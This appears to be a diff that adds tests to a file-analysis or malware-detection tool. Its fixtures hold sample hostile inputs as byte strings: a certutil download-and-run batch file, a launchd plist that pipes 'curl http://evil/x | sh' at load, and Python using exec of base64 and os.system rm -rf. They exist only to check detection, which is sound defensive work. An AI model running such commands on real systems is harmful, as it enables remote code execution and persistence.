@@ -78,6 +78,71 @@ def test_scoring_model_is_self_consistent():
     assert model["hard_overrides"]
 
 
+def test_python_script_constructs_detected():
+    code = (
+        b"import os, base64\n"
+        b"exec(base64.b64decode('cHJpbnQ='))\n"
+        b"os.system('rm -rf /tmp/x')\n"
+    )
+    report = analyze(code, "loader.py")
+    c = next(a for a in report["analyzers"] if a["analyzer"] == "code")
+    assert c["metadata"]["language"] == "python"
+    ids = {f["id"] for f in report["findings"]}
+    assert "code.suspicious_constructs" in ids
+    patterns = {i["pattern"] for i in c["metadata"]["indicators"]}
+    assert "exec()" in patterns and "os.system()" in patterns
+
+
+def test_batch_download_execute():
+    bat = b"@echo off\r\ncertutil -urlcache -f http://evil/x.exe x.exe\r\nstart x.exe\r\n"
+    report = analyze(bat, "run.bat")
+    c = next(a for a in report["analyzers"] if a["analyzer"] == "code")
+    assert c["metadata"]["language"] == "batch"
+    assert any(i["pattern"] == "certutil" for i in c["metadata"]["indicators"])
+
+
+def test_launchd_plist_persistence():
+    plist = (
+        b'<?xml version="1.0"?>\n<!DOCTYPE plist>\n<plist><dict>'
+        b"<key>RunAtLoad</key><true/>"
+        b"<key>ProgramArguments</key><array><string>/bin/sh</string>"
+        b"<string>-c</string><string>curl http://evil/x | sh</string></array>"
+        b"</dict></plist>"
+    )
+    report = analyze(plist, "com.evil.agent.plist")
+    ids = {f["id"] for f in report["findings"]}
+    assert "code.launchd_persistence" in ids
+
+
+def test_macho_parsing_and_unsigned():
+    import struct
+
+    name = b"/usr/lib/libSystem.B.dylib\x00"
+    name += b"\x00" * ((-len(name)) % 8)
+    dylib_cmd = struct.pack("<IIIIII", 0x0C, 24 + len(name), 24, 0, 0, 0) + name
+    header = struct.pack(
+        "<IIIIIII", 0xFEEDFACF, 0x01000007, 3, 2, 1, len(dylib_cmd), 0
+    ) + b"\x00\x00\x00\x00"  # reserved (64-bit header)
+    data = header + dylib_cmd
+
+    report = analyze(data, "binary")
+    m = next(a for a in report["analyzers"] if a["analyzer"] == "macho")
+    assert m["metadata"]["is_macho"] is True
+    assert m["metadata"]["arch"] == "x86_64"
+    assert any("libSystem" in d for d in m["metadata"]["dylibs"])
+    assert m["metadata"]["code_signature"] is False
+    assert any(f["id"] == "macho.unsigned" for f in report["findings"])
+
+
+def test_readable_strings_filter_noise():
+    from backend.analyzers.utils import is_human_readable
+
+    assert is_human_readable("Could not open configuration file")
+    assert is_human_readable("/usr/local/bin/python3")
+    assert not is_human_readable("x8Fk2Lq")
+    assert not is_human_readable("aaaaaa")
+
+
 def test_full_iocs_included():
     data = b"visit http://evil.example.com/payload and http://c2.test/beacon now"
     report = analyze(data, "ioc.txt")
